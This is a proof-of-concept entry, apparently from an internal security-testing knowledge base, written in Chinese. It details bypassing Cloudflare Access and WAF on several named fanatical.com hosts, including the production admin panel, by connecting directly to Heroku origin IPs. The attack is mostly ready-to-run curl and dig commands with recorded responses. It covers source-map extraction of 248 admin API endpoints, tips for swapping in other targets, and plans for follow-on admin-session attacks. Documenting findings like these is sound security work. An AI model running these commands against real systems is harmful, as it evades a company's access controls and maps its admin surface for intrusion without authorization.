# Heroku 源站直连绕过 Cloudflare Access/WAF：herokudns 解析出 GA 源站 IP + Host 头路由免 SSO 直达站点（生产 admin 248 /api/admin/* + source map / adminstaging / staging / prelive / testing / www）

- **code**: heroku-origin-direct-bypass-cloudflare-access-host-header
- **kind**: poc
- **category**: auth-bypass
- **component**: Cloudflare Zero Trust Access + WAF / Heroku 前端（herokudns）
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 【同一 code 合并条目，续加第 4 组实例：生产后台 admin.fanatical.com】本次证据（2026-11-11 14:56-15:00 UTC，本机 Git Bash + curl，任务 task#5 / finding_id=76，verdict=verified）：① 源站确认 `nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1` → 13.248.131.213 / 15.197.152.254 / 35.71.150.51；② 基线经 CF `curl https://admin.fanatical.com/` → HTTP/2 302（server: cloudflare, cf-ray: a58e24fb097b9604-SJC，跳 fanatical.cloudflareaccess.com/cdn-cgi/access/login/admin.fanatical.com?...）；③ 绕过 `curl -sk --noproxy '*' --resolve admin.fanatical.com:443:13.248.131.213 https://admin.fanatical.com/` → HTTP/2 200，server: Heroku, via: 2.0 heroku-router，无 cf-ray，content-length 5251，body <title>Admin | Fanatical</title>，证明未认证摘除 CF Zero Trust Access 直达生产 admin SPA；④ 源码面 `GET /dist/modules.5f26b876.js.map`（同法直连）→ 200 application/json，4,811,730 字节，grep 出 248 个唯一 /api/admin/* 端点；⑤ 边界：`GET /api/admin/users/generate-admin-login-token/1` → 401 {"code":401,"error":"User not authenticated"}，应用层 admin JWT 仍在，本绕过不突破登录。既有证据（前几轮同 code）已覆盖 admin.fanatical.com(admin SPA)、adminstaging.fanatical.com、staging/prelive/testing.fanatical.com 与 www.fanatical.com。证伪条件（直连仍 302 或出现 cf-ray）未触发。
- **path**: pocs/heroku-origin-direct-bypass-cloudflare-access-host-header/poc.md
- **tags**: cloudflare-access, cloudflare-zero-trust, heroku, herokudns, origin-ip, host-header-routing, waf-bypass, sso-bypass, origin-ip-leak, noproxy, fanatical, admin, production, source-map, api-admin-enum
- **created_at**: 2026-11-11T12:52:57.957Z
- **engine**: https://admin.fanatical.com（生产后台，Heroku GA 13.248.131.213 / 15.197.152.254 / 35.71.150.51）；同族 adminstaging/staging/prelive/testing/www
- **found_by**: internal

## 描述

原理：目标 DNS 为 CNAME -> <app>.herokudns.com（Heroku 自定义域），Heroku 前端按 Host 头路由。只要 TCP 直连到 Heroku GA 源站 IP 并带正确 Host，源站应用即直接响应，Cloudflare 边缘的 Zero Trust Access（302 跳 <team>.cloudflareaccess.com）与 WAF/CDN 完全不参与。适用面：Cloudflare 前置 + Heroku 托管的应用（.herokudns.com / 自定义域）。注意本绕过只摘掉 CF 边界的 Access/WAF，不等于应用自身鉴权被绕过（后台 API 在应用层仍 401）。同族实测四组源站：生产后台 admin.fanatical.com(fan-api-admin, GA 13.248.131.213 等)、预发后台 adminstaging.fanatical.com(fan-api-staging-admin)、预发店面前端 staging/prelive/testing.fanatical.com（同 GA IP 3.33.161.45）；主站 www.fanatical.com 的 CF WAF 同样可绕。生产 admin 直连后可拉到 248 个 /api/admin/* 接口面与 4.8MB 前端 source map。

## 用法

```
--noproxy '*' 是硬要求（本机代理会重解析 DNS 使 --resolve 失效，请求又回到 Cloudflare）。
最小复现（生产 admin 为例）：
  nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1           # 拿 GA 源站 IP
  curl -sk -D - --max-time 20 https://admin.fanatical.com/             # 基线：302 到 cloudflareaccess.com
  curl -sk --noproxy '*' -D - --resolve admin.fanatical.com:443:13.248.131.213 https://admin.fanatical.com/   # 绕过：200 server: Heroku
  curl -sk --noproxy '*' -o modules.map -w '%{http_code} %{size_download}\n' --resolve admin.fanatical.com:443:13.248.131.213 https://admin.fanatical.com/dist/modules.5f26b876.js.map  # 源码 map 200 4811730
  grep -oE '/api/admin/[a-zA-Z0-9_/-]+' modules.map | sort -u | wc -l  # 248 个接口面
替换点：把 admin.fanatical.com 换成同族任一目标域（adminstaging / staging / prelive / testing / www），GA IP 用 `dig <域>.herokudns.com` 重取（会变）。判据：直连返回 200 且 Server: Heroku、无 cf-ray；经 CF 必 302 到 cloudflareaccess.com。注意应用层 admin JWT 仍在（/api/admin/* 一律 401），本绕过只摘掉 CF Access 边界。
```

## 正文

```
# Heroku 源站直连绕过 Cloudflare Access / WAF（Host 头路由）

## 适用面
- 目标前有 Cloudflare（Access / Zero Trust / WAF / CDN），真实应用托管在 Heroku。
- 站点 DNS 是 CNAME -> `<app>.herokudns.com`（Heroku 自定义域）。
- Heroku 前端是「按 Host 头路由」的多租户入口：只要 TCP 直连到 Heroku GA 源站 IP 并带正确 Host，
  源站应用就直接响应；Cloudflare 边缘的 Access（302 跳 `<team>.cloudflareaccess.com`）与 WAF 完全不参与。
- 注意：本绕过只摘掉 CF 边界的 Access/WAF，**不等于拿到应用自身鉴权**（登录/SSO 在应用层仍生效）。

## 前置条件
- 能直连公网 443。
- 本机若挂了 HTTP 代理，代理会自行解析 DNS 使 `--resolve` 无效，必须加 `--noproxy '*'`（否则又回到 Cloudflare）。
  同类坑见 kb「出口 IP 与 Host 头是两个独立变量…curl 必须 --noproxy」(id 260) 与「本地 HTTP 代理按 Host 分流制造命中假象」(id 28)。
- 已知源站主机名（通常就是目标自定义域本身）与 Heroku GA 源站 IP。

## 步骤

### 1) 确认目标在 Heroku 上注册了自定义域（herokudns 解析出 GA 源站 IP）
```bash
dig +short CNAME frontend.fanatical.com @1.1.1.1
# 或
dig +short A admin.fanatical.com.herokudns.com
# 输出 GA IP（admin 实例本次 4 个）：3.33.161.45, 13.248.131.213, 15.197.152.254, 35.71.150.51
```

### 2) 对照基线：经 Cloudflare 访问 -> 被 Access 拦截
```bash
curl -sk -D - --max-time 20 https://admin.fanatical.com/
# HTTP/2 302 -> https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/admin.fanatical.com?...
# server: cloudflare（响应含 cf-ray）
```

### 3) 绕过成立：直连源站 IP + Host 头 -> 真实后台 SPA
```bash
curl -sk --noproxy '*' -D - --max-time 25 \
  --resolve admin.fanatical.com:443:3.33.161.45 \
  https://admin.fanatical.com/
# HTTP/2 200
# server: Heroku
# via: 2.0 heroku-router
# <title>Admin | Fanatical</title>
# window.SENTRY_ENVIRONMENT = 'fan-api-admin';
# 无 cf-ray、无 Access 跳转
```

### 4) 可复现性：herokudns 返回的每个 GA IP 都 200
```bash
for ip in 3.33.161.45 13.248.131.213 15.197.152.254 35.71.150.51; do
  curl -sk --noproxy '*' -o /dev/null -w "$ip %{http_code}\n" --max-time 20 \
    --resolve admin.fanatical.com:443:$ip https://admin.fanatical.com/
done
# 4 个 IP 均 200，server: Heroku
```

### 5) 主站 www 的 Cloudflare WAF 同样可绕
```bash
curl -sk --noproxy '*' -o /dev/null -w '%{http_code}|%{size_download}\n' --max-time 25 \
  --resolve www.fanatical.com:443:3.33.161.45 https://www.fanatical.com/
# 200|100801 server: Heroku（无 cf-ray / 无 x-is-cf-worker），body <title>Fanatical</title>
```

### 6) 第二个源站实例：预发后台 adminstaging.fanatical.com（Heroku app `fan-api-staging-admin`）
同一手法、不同 GA IP 段，直达预发后台 SPA 与完整 `/api/admin/*` 面。

```bash
# 6.1 基线：经 Cloudflare -> 被 Zero Trust Access 拦截
curl -sk -D - --max-time 20 https://adminstaging.fanatical.com/
# HTTP/2 302 -> https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/adminstaging.fanatical.com?kid=...&meta=...
# server: cloudflare, cf-ray: a58d83488ed97c8f-SJC

# 6.2 源站主机名/GA IP（4 个）：adminstaging.fanatical.com -> fan-api-staging-admin.herokudns.com
#     3.33.240.98 / 13.248.132.84 / 76.223.120.82 / 166.117.102.95

# 6.3 源站应用自报家门（确认 app 名 / 该 app 即预发站源站）
curl -sk --noproxy '*' https://fan-api-staging-admin.herokuapp.com/
# HTTP/2 403 {"error":"403: Forbidden","message":"The app must be accessed through https://staging.fanatical.com/api"}  server: Heroku, via: 2.0 heroku-router

# 6.4 绕过：直连源站 IP + Host 头 -> 真实后台 SPA（每个 GA IP 逐一 200）
curl -sk --noproxy '*' -D - --max-time 25 \
  --resolve adminstaging.fanatical.com:443:3.33.240.98 \
  https://adminstaging.fanatical.com/
# HTTP/2 200, server: Heroku, content-length: 5013
# <title>Admin | Fanatical</title>, window.SENTRY_ENVIRONMENT='fan-api-staging-admin'
# 无 cf-ray、无 Access 跳转

# 6.5 绕过 CF 后直达后台 API 面（应用自身鉴权仍在 -> 401，利用上限=触达表面）
curl -sk --noproxy '*' -o /dev/null -w '%{http_code}\n' \
  --resolve adminstaging.fanatical.com:443:3.33.240.98 \
  https://adminstaging.fanatical.com/api/admin/users
# 401 {"code":401,"error":"User not authenticated"}
```

#### 6.6 接口面测绘（绕过 CF 后可枚举）
- 首页 SPA bundle 指向 `/dist/app.<hash>.js`；其 source map `/dist/app.d13b4509.js.map` 非预期 200（约 35910 字节）-> 可还原全部 `/api/admin/*` 调用。
- 共约 120 条 `/api/admin/*` 接口面（订单 / B2B / 用户 / 礼品卡序列号 / redeem-codes / 上传等）。
- 关键限制：所有 `/api/admin/*` 在应用层返回 `401 {"code":401,"error":"User not authenticated"}` —— 本绕过只摘掉 CF Access(Zero Trust SSO) 边界，**不等于登录后台**。价值在于拿到完整后台表面、OAuth/SSO 入口与前端源码，供后续测试（弱凭据验证 / SSO 逻辑 / 接口访问控制验证）使用。
- 6.3 的 403 响应里出现 `staging.fanatical.com`，是「该 Heroku app 就是预发站源站」的有力旁证。

### 7) 第三组实例：预发店面前端 staging / prelive / testing.fanatical.com（同族 GA IP 3.33.161.45）
这三个是**面向用户的预发 storefront**（非后台），受同一 Cloudflare Zero Trust Access 保护，直连同一 GA 源站 IP 即可拿到真实 storefront SPA。

```bash
# 7.1 基线：经 Cloudflare -> 被 Zero Trust Access 拦截
curl -sk -D - --max-time 20 https://staging.fanatical.com/
# HTTP/2 302
# location: https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/staging.fanatical.com?kid=513f8e5e...&meta=...
# server: cloudflare, cf-ray: a58dafb5eb967ad9-SJC

# 7.2 绕过：直连源站 IP + Host 头 -> 真实 storefront SPA（200, server: Heroku）
curl -sk --noproxy '*' -D - --max-time 25 \
  --resolve staging.fanatical.com:443:3.33.161.45 \
  https://staging.fanatical.com/
# HTTP/2 200
# server: Heroku
# via: 2.0 heroku-router
# content-length: 90287
# body: <title>Fanatical</title>（storefront SPA）
#   link 预加载 /static/css/HitCard.34a65e32.css、/static/css/bootstrap.3b6a695d.css
# 无 cf-ray、无 Access 跳转

# 7.3 三个环境镜像子域同法复现（非单点偶发）
curl -sk --noproxy '*' -o /dev/null -w 'prelive %{http_code} %{size_download}\n' \
  --resolve prelive.fanatical.com:443:3.33.161.45 https://prelive.fanatical.com/
# prelive 200 89669
curl -sk --noproxy '*' -o /dev/null -w 'testing %{http_code} %{size_download}\n' \
  --resolve testing.fanatical.com:443:3.33.161.45 https://testing.fanatical.com/
# testing 200 89735（均 <title>Fanatical</title>）
```

### 8) 第四组实例（本实例）：生产后台 admin.fanatical.com —— 248 个 /api/admin/* + modules 源码 map 泄露
同一手法作用于**生产**后台。GA 源站 IP 与 adminstaging 同段但取值不同：
`admin.fanatical.com` -> `fan-api-admin.herokudns.com` -> A `13.248.131.213` / `15.197.152.254` / `35.71.150.51`（另含 §1 的 3.33.161.45）。

```bash
# 8.1 herokudns 解析出 GA 源站 IP
nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1
# 13.248.131.213 / 15.197.152.254 / 35.71.150.51

# 8.2 基线：经 CF -> 被 Zero Trust Access 拦截
curl -sk -D - --max-time 20 https://admin.fanatical.com/
# HTTP/2 302 -> https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/admin.fanatical.com?...
# server: cloudflare, cf-ray: a58e24fb097b9604-SJC

# 8.3 绕过：直连源站 IP + Host 头 -> 生产 admin SPA
curl -sk --noproxy '*' -D - --max-time 25 \
  --resolve admin.fanatical.com:443:13.248.131.213 \
  https://admin.fanatical.com/
# HTTP/2 200, server: Heroku, via: 2.0 heroku-router, content-length: 5251
# <title>Admin | Fanatical</title>，无 cf-ray、无 Access 跳转

# 8.4 源站应用自报家门（确认该 app 即生产 admin；Heroku 侧有 Host 守卫）
curl -sk --noproxy '*' https://fan-api-admin.herokuapp.com/
# 403 {"error":"403: Forbidden","message":"The app must be accessed through ..."}
#   -> 直接拿 app 名访问被拒，必须用自定义域 Host 头才放行

# 8.5 前端源码 map 非预期 200 -> 还原全量 /api/admin/* 接口面（248 个）
curl -sk --noproxy '*' -o modules.map -w '%{http_code} %{size_download} %{content_type}\n' \
  --resolve admin.fanatical.com:443:13.248.131.213 \
  https://admin.fanatical.com/dist/modules.5f26b876.js.map
# 200 4811730 application/json
grep -oE '/api/admin/[a-zA-Z0-9_/-]+' modules.map | sort -u | wc -l   # 248

# 8.6 应用层 admin JWT 仍在（边界未突破）
curl -sk --noproxy '*' -w '\n%{http_code}\n' \
  --resolve admin.fanatical.com:443:13.248.131.213 \
  https://admin.fanatical.com/api/admin/users/generate-admin-login-token/1
# 401 {"code":401,"error":"User not authenticated"}
```

生产版接口面（248 个，含订单 / B2B / 用户 / 礼品卡序列号 / redeem-codes / 上传 / `generate-admin-login-token` 等）
较预发 adminstaging（约 120 个）**翻倍**。价值：拿到完整生产管理面清单 + OAuth/SSO 入口 + 前端源码，
供后续获取 admin 会话路线（OAuth 域校验等）与接口访问控制验证。
边界：应用层 admin JWT 仍生效，本绕过**不等于登录后台**。

## 判据
- **命中**：直连源站 IP + `Host: <目标域>` 返回 200，`Server: Heroku`（/ `via: 2.0 heroku-router`），body 是真实应用内容；
  同时对照经 Cloudflare 时返回 302 到 `<team>.cloudflareaccess.com`（Access）或响应头出现 `cf-ray`（WAF）。
- **证伪**：直连该 IP 仍 302 到 `cloudflareaccess.com` 或响应头出现 `cf-ray` -> 该 IP 不是源站，或前端已改成直接回源/只放 CF IP，本绕过不成立。
- 直接用 `https://<app>.herokuapp.com/`（不带自定义域 Host）通常返回 403 Host 守卫，属正常，不等于绕过失败。

## 失败常见原因
- **走了本机/系统代理**：代理自己解析 DNS，`--resolve` 不生效，请求又回到 Cloudflare。务必 `--noproxy '*'` 或换干净出口。
- **Heroku GA IP 会变动**：共享/动态分配，隔一段时间需重新 `dig <app>.herokudns.com`。
- 站点改用 **Cloudflare Tunnel** 或源站防火墙只放 Cloudflare 网段（Authenticated Origin Pulls）-> 直连被拒。
- 应用自身有**二次鉴权**（登录/SSO 在应用层）：直连只绕过 CF 边界，后台仍可能要求登录（本族各实例均如此，API 401）。

## 关联（同族技巧，可交叉复用）
- 源站 IP 泄露/CF 绕过的通用手法：kb id 94（TLS 证书 CN 反查不走 CDN 的子域）。
- `--noproxy '*'` 纪律与「代理按 Host 分流」假象：kb id 260、id 28。
- 同产品前端源码泄露：kb id 506（fanatical.com React source map 非预期）。

```
